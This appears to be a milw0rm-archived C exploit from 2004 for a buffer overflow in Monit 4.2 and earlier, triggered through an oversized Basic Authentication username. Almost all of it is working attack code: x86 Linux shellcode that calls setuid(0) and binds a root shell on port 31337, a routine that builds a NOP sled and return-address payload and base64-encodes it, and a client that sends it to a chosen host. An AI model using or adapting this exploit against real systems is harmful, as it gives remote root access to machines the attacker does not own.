<html><head><title>Monit <= 4.2 Remote Root Buffer Overflow Exploit
</title></head><pre>/*
 * THE EYE ON SECURITY RESEARCH GROUP - INDIA
 *
 * www eos-india net poc 305monit.c
 * Remote Root Exploit for Monit &lt;= 4.2
 * Vulnerability: Buffer overflow in handling of Basic Authentication informations.
 * Server authenticates clients through:
 * Authentication: Basic Base64Encode[UserName:Password]
 * Here we are exploiting the insecure handling of username in Basic Authentication information to return
 * control (EIP) to our payload.
 *
 * Nilanjan De [n2n linuxmail org] - Abhisek Datta [abhisek front ru]
 *
 * 06.04.2004
 * www eos-india net
*/

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;

#define 	BUFF_SIZE	2048
#define		PADDING		40
#define		EXP_SIZE	(256+4+PADDING)
#define MAX_ARCH 2
struct eos{
	char *arch;
	unsigned long ret;
} targets[] = {
	&quot;Monit-4.2-Gentoo&quot;,
	0xbf7fef02,
	//-------------------------------
	&quot;Monit &lt;=4.2 Crash&quot;,
	0xbadc0ded,
	NULL,
	0
};
/*
 x86 linux portbind a shell in port 31337
 based on shellcode from www.shellcode.com.ar
 with a few modifications by us
*/
 
char shellcode[]=
        /* sys_fork() */
	&quot;\x31\xc0&quot;                      // xorl         %eax,%eax
	&quot;\x31\xdb&quot;                      // xorl         %ebx,%ebx
	&quot;\xb0\x02&quot;                      // movb         $0x2,%al
	&quot;\xcd\x80&quot;                      // int          $0x80
	&quot;\x38\xc3&quot;                      // cmpl         %ebx,%eax
	&quot;\x74\x05&quot;                      // je           0x5
	/* sys_exit() */
	&quot;\x8d\x43\x01&quot;                  // leal         0x1(%ebx),%eax
	&quot;\xcd\x80&quot;                      // int          $0x80
        /* setuid(0) */
        &quot;\x31\xc0&quot;                      // xorl         %eax,%eax
        &quot;\x31\xdb&quot;                      // xorl         %ebx,%ebx
        &quot;\xb0\x17&quot;                      // movb         $0x17,%al
        &quot;\xcd\x80&quot;                      // int          $0x80
        /* socket() */
        &quot;\x31\xc0&quot;                      // xorl    %eax,%eax
        &quot;\x89\x45\x10&quot;                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)
        &quot;\x40&quot;                          // incl    %eax
        &quot;\x89\xc3&quot;                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)
        &quot;\x89\x45\x0c&quot;                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)
        &quot;\x40&quot;                          // incl    %eax
        &quot;\x89\x45\x08&quot;                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)
	&quot;\x8d\x4d\x08&quot;                  // leal    0x8(%ebp),%ecx
        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
        &quot;\xcd\x80&quot;                      // int     $0x80
        &quot;\x89\x45\x08&quot;                  // movl    %eax,0x8(%ebp)

        /* bind()*/
        &quot;\x43&quot;                          // incl    %ebx(SYS_BIND = 0x2)
        &quot;\x66\x89\x5d\x14&quot;              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)
	&quot;\x66\xc7\x45\x16\x7a\x69&quot;      // movw    $0x697a,0x16(%ebp)(port=31337)
        &quot;\x31\xd2&quot;                      // xorl    %edx,%edx
        &quot;\x89\x55\x18&quot;                  // movl    %edx,0x18(%ebp)
        &quot;\x8d\x55\x14&quot;                  // leal    0x14(%ebp),%edx
        &quot;\x89\x55\x0c&quot;                  // movl    %edx,0xc(%ebp)
        &quot;\xc6\x45\x10\x10&quot;              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)
        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
        &quot;\xcd\x80&quot;                      // int     $0x80
 
        /* listen() */
        &quot;\x40&quot;                          // incl    %eax
        &quot;\x89\x45\x0c&quot;                  // movl    %eax,0xc(%ebp)
        &quot;\x43&quot;                          // incl    %ebx
        &quot;\x43&quot;                          // incl    %ebx(SYS_LISTEN = 0x4)
        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
        &quot;\xcd\x80&quot;                      // int     $0x80
 
        /* accept() */
        &quot;\x43&quot;                          // incl    %ebx
        &quot;\x89\x45\x0c&quot;                  // movl    %eax,0xc(%ebp)
        &quot;\x89\x45\x10&quot;                  // movl    %eax,0x10(%ebp)
        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
        &quot;\xcd\x80&quot;                      // int     $0x80
        &quot;\x89\xc3&quot;                      // movl    %eax,%ebx
 
        /* dup2() */
        &quot;\x31\xc9&quot;                      // xorl    %ecx,%ecx
        &quot;\xb0\x3f&quot;                      // movb    $0x3f,%al
        &quot;\xcd\x80&quot;                      // int     $0x80
        &quot;\x41&quot;                          // incl    %ecx
        &quot;\x80\xf9\x03&quot;                  // cmpb    $0x3,%cl
        &quot;\x75\xf6&quot;                      // jne     -0xa
 
        /* execve() */
        &quot;\x31\xd2&quot;                      // xorl    %edx,%edx
        &quot;\x52&quot;                          // pushl   %edx
        &quot;\x68\x6e\x2f\x73\x68&quot;          // pushl   $0x68732f6e
        &quot;\x68\x2f\x2f\x62\x69&quot;          // pushl   $0x69622f2f
        &quot;\x89\xe3&quot;                      // movl    %esp,%ebx
        &quot;\x52&quot;                          // pushl   %edx
        &quot;\x53&quot;                          // pushl   %ebx
        &quot;\x89\xe1&quot;                      // movl    %esp,%ecx
        &quot;\xb0\x0b&quot;                      // movb    $0xb,%al
        &quot;\xcd\x80&quot;;                     // int     $0x80

void show_help(char *pr00gie,u_short opt) {
	int i=0;
	printf(&quot;==========&gt; THE EYE ON SECURITY RESEARCH GROUP &lt;==========\n&quot;);
	printf(&quot;Monit &lt;= 4.2 Remote Root Exploit\n&quot;);
	printf(&quot;n2n[at]linuxmail[dot]org - abhisek[at]front[dot]ru\n&quot;);
	printf(&quot;http://www.eos-india.net\n\n&quot;);
	if(!opt)
		return;
	printf(&quot;[usage]\n&quot;);
	printf(&quot;%s [Remote Host] [Remote Port] [Target]\n&quot;,pr00gie);
	printf(&quot;[Available Targets]\n&quot;);
	while(targets[i].arch != NULL) {
		printf(&quot;%d. - %s\t - %p\n&quot;,(i),targets[i].arch,targets[i].ret);				
		i++;
	}
}
/* Base 64 code ripped from monit src */
/**
 * Base64 encode one byte
 */
static char encode(unsigned char u) {

  if(u &lt; 26)  return 'A'+u;
  if(u &lt; 52)  return 'a'+(u-26);
  if(u &lt; 62)  return '0'+(u-52);
  if(u == 62) return '+';

  return '/';

}
/**
 * Base64 encode and return size data in 'src'. The caller must free the
 * returned string.
 * @param size The size of the data in src
 * @param src The data to be base64 encode
 * @return encoded string otherwise NULL
 */
char *encode_base64(int size, unsigned char *src) {

  int i;
  char *out, *p;

  if(!src)
    return NULL;

  if(!size)
    size= strlen((char *)src);

  out= (char *)malloc(sizeof(char)*size*4/3+4);

  p= out;

  for(i=0; i&lt;size; i+=3) {

    unsigned char b1=0, b2=0, b3=0, b4=0, b5=0, b6=0, b7=0;

    b1 = src[i];

    if(i+1&lt;size)
      b2 = src[i+1];

    if(i+2&lt;size)
      b3 = src[i+2];

    b4= b1&gt;&gt;2;
    b5= ((b1&amp;0x3)&lt;&lt;4)|(b2&gt;&gt;4);
    b6= ((b2&amp;0xf)&lt;&lt;2)|(b3&gt;&gt;6);
    b7= b3&amp;0x3f;

    *p++= encode(b4);
    *p++= encode(b5);

    if(i+1&lt;size) {
      *p++= encode(b6);
    } else {
      *p++= '=';
    }

    if(i+2&lt;size) {
      *p++= encode(b7);
    } else {
      *p++= '=';
    }

  }

  return out;

}


void make_http_request(char *buff,int size,char *host,unsigned long *magic) {
	char *exp_buff;
	char *exp_buff_encoded;
	int i;
	if (!(exp_buff=(char*)malloc(EXP_SIZE))){
		perror(&quot;malloc()&quot;);
		exit(1);
	}
	
	memset(exp_buff,0x90,EXP_SIZE);
	strcpy(exp_buff+256-strlen(shellcode),shellcode);
	for(i=256;i&lt;EXP_SIZE-5;i+=4)
		memcpy(exp_buff+i,magic,4);
	strcpy(exp_buff+EXP_SIZE-4,&quot;:x&quot;);
	exp_buff_encoded=encode_base64(EXP_SIZE,exp_buff);	
	memset(buff,0x00,size);
	sprintf(buff,&quot;GET / HTTP/1.0\r\n&quot;);
	sprintf(buff,&quot;%sHost: %s\r\n&quot;,buff,host);
	sprintf(buff,&quot;%sAuthorization: Basic %s\r\n\r\n\r\n&quot;,buff,exp_buff_encoded);
	
}
int main(int argc,char *argv[]) {
	char *host;
	char *b;
	int rport;
	int sockfd;
	struct sockaddr_in sin;
	struct hostent *h;
	unsigned int n;
	unsigned long magic;
	if(argc != 4) {
		show_help(argv[0],1);
		exit(1);
	}
	host=argv[1];
	rport=(atoi(argv[2]));
	n=atoi(argv[3]);
	if((n &gt;= MAX_ARCH)||(n&lt;0)) {
		printf(&quot;- Invalid target\n&quot;);
		show_help(argv[0],1);
		exit(1);
		}
	magic=targets[n].ret;
	show_help(argv[0],0);
	printf(&quot;-Using RET %p\n&quot;,magic);
	printf(&quot;Resolving %s\t&quot;,host);
	h=gethostbyname(host);
	if(!h) {
		printf(&quot;[ERROR]\nUnable to resolve: %s\n&quot;,host);
		exit(1);
	}
	else
	printf(&quot;[DONE]\n&quot;);
	b=(char*)malloc(BUFF_SIZE);
	if(!b) {
		perror(&quot;malloc&quot;);
		exit(1);
	}
	sin.sin_addr=*((struct in_addr*)h-&gt;h_addr);
	sin.sin_family=AF_INET;
	sin.sin_port=htons((u_short)rport);
	if((sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))&lt;0){
		perror(&quot;socket&quot;);
		exit(1);
	}
	printf(&quot;Connecting to %s:%d\t&quot;,host,rport);
	if(connect(sockfd,(struct sockaddr*)&amp;sin,sizeof(sin))&lt;0) {
		printf(&quot;[ERROR]\nUnable to connect: %s:%d\n&quot;,host,rport);
		perror(&quot;connect&quot;);
		exit(1);
	}
	else
	printf(&quot;[DONE]\n&quot;);
	make_http_request(b,BUFF_SIZE,host,&amp;magic);
	if(send(sockfd,b,strlen(b),0) == strlen(b))
		printf(&quot;Successfully send exploit string\n&quot;);
	else
		printf(&quot;Failed sending exploit string\n&quot;);
	close(sockfd);
	return 0;
}




// milw0rm.com [2004-04-12]</pre></html>